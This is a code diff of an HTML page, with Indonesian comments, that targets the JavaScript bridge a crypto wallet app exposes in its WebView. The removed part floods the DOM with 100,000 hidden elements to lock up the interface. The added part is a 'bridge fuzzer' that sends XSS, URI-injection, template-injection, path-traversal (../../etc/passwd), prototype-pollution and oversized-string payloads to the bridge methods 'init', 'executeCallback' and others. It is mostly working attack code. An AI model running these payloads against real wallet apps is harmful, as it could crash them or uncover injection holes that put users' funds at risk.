@@ -2,43 +2,73 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Business Logic Exploit: UI Lockout</title>
+    <title>Bridge Fuzzer - Security Research</title>
 </head>
-<body style="background: #111; color: #fff; font-family: sans-serif; text-align: center; padding: 30px;">
+<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center;">
 
-    <div style="border: 2px dashed #ff9500; padding: 20px; border-radius: 15px;">
-        <h2 style="color: #ff9500;">⚠️ UI LOCKOUT TEST</h2>
-        <p>Target: WebView Rendering Engine</p>
-        
-        <button onclick="domOverload()" style="padding: 20px; background: #ff9500; color: #000; border: none; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer;">
-            EXECUTE DOM OVERLOAD
+    <h2>DApp Bridge Fuzzer</h2>
+    <div style="border: 1px solid #0f0; padding: 15px; border-radius: 10px; background: #111;">
+        <button onclick="startFuzzing()" style="padding: 15px; background: #0f0; color: #000; font-weight: bold; border: none; width: 100%; cursor: pointer;">
+            START AUTOMATED FUZZING
         </button>
-
-        <p id="status" style="margin-top: 20px; font-size: 12px; color: #888;">Status: Ready</p>
+        <div id="log" style="text-align: left; margin-top: 20px; font-size: 10px; height: 300px; overflow-y: scroll; border-top: 1px solid #333; padding-top: 10px;">
+            > System ready. Waiting for command...
+        </div>
     </div>
 
     <script>
-    function domOverload() {
-        const status = document.getElementById('status');
-        status.innerText = "Generating 100,000 elements...";
-        
-        // Loop masif untuk membebani Rendering Engine
-        for (let i = 0; i < 100000; i++) {
-            const el = document.createElement('div');
-            // Membuat elemen yang tidak terlihat tapi tetap harus dihitung oleh GPU/CPU
-            el.style.cssText = "position:fixed; width:1px; height:1px; opacity:0.01; z-index:-1;";
-            document.body.appendChild(el);
-        }
+    function log(msg) {
+        const l = document.getElementById('log');
+        l.innerHTML += `<div>> ${msg}</div>`;
+        l.scrollTop = l.scrollHeight;
+    }
 
-        // Setelah merusak UI, kita kirim sinyal ke bridge Solana yang tadi kita temukan
-        if (window.OneInchSolanaWallet) {
-            window.OneInchSolanaWallet.init("DOM_OVERLOAD_COMPLETE");
-        }
+    async function startFuzzing() {
+        const target = window.OneInchSolanaWallet;
+        if (!target) return alert("Target Bridge Not Found!");
 
-        status.innerText = "DOM Flooded. Check app responsiveness.";
-        status.style.color = "#ff9500";
+        // Daftar Payload Kerentanan
+        const payloads = [
+            "<script>alert(document.domain)<\/script>", // Basic XSS
+            "javascript:alert(1)",                       // URI Injection
+            "{{7*7}}",                                   // Template Injection
+            "../../etc/passwd",                          // Path Traversal
+            "{\"__proto__\":{\"polluted\":\"true\"}}",   // Prototype Pollution
+            null,                                        // Type Confusion
+            undefined,                                   // Null Pointer
+            "A".repeat(1000000)                          // Buffer Overflow
+        ];
+
+        // Daftar Fungsi yang ditemukan di scan Anda
+        const methods = ['init', 'accountChanged', 'executeCallback', 'chainChanged'];
+
+        log("Starting Fuzzing on " + methods.length + " methods...");
+
+        for (let method of methods) {
+            if (typeof target[method] === 'function') {
+                log(`Testing method: ${method}`);
+                
+                for (let p of payloads) {
+                    try {
+                        log(`Sending payload to ${method}...`);
+                        // Mencoba mengeksekusi dengan payload berbeda
+                        target[method](p); 
+                        
+                        // Khusus executeCallback biasanya butuh lebih dari 1 argumen
+                        if (method === 'executeCallback') {
+                            target[method]("1", p, true);
+                        }
+                        
+                        // Jeda singkat agar WebView tidak langsung mati total
+                        await new Promise(r => setTimeout(r, 100)); 
+                    } catch(e) {
+                        log(`Notice: ${method} caught error: ${e.message}`);
+                    }
+                }
+            }
+        }
+        log("Fuzzing complete. Check for crashes or alerts.");
     }
     </script>
-
 </body>
 </html>
